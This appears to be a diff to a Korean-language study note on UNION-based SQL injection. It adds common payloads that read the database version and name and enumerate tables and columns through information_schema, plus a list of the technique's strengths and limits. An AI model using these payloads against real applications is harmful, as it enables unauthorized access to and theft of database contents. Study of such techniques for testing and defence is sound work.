@@ -196,3 +196,22 @@ SELECT name, description FROM products WHERE id = '1' UNION SELECT username, pas
 화면에는 상품 정보와 함께(또는 대신) 사용자 계정 정보가 출력됨.
 
 **자주 보이는 쿼리**
+컬럼 수를 맞춘 상태에서 진행 해야함.
+```
+' UNION SELECT @@version, NULL, NULL -- -
+' UNION SELECT database(), NULL, NULL -- -
+' UNION SELECT table_name, NULL, NULL FROM information_schema.tables -- -
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- -
+```
+
+**장점과 한계**
+
+장점
+- 한 번의 요청으로 많은 데이터를 가져올 수 있음
+- 결과가 화면에 바로 보이기 때문에 직관적
+- Blind 기법보다 훨씬 빠름
+
+한계
+- **결과가 화면에 출력되어야 함**
+- 컬럼 수와 데이터 타입을 맞춰야 함
+- 일부 필터나 WAF가 `UNION` 키워드를 차단하는 경우가 있음
